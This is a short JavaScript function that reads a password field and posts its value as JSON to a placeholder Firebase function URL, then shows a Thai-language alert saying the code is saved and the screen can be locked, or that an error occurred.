function sendPassword() {
    var password = document.getElementById("passwordInput").value;
    fetch('https://your-firebase-function-url.com/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: password })
    }).then(response => {
        if (response.ok) {
            alert("บันทึกรหัสแล้ว ล็อกหน้าจอของคุณ!");
        } else {
            alert("เกิดข้อผิดพลาด!");
        }
    });
}
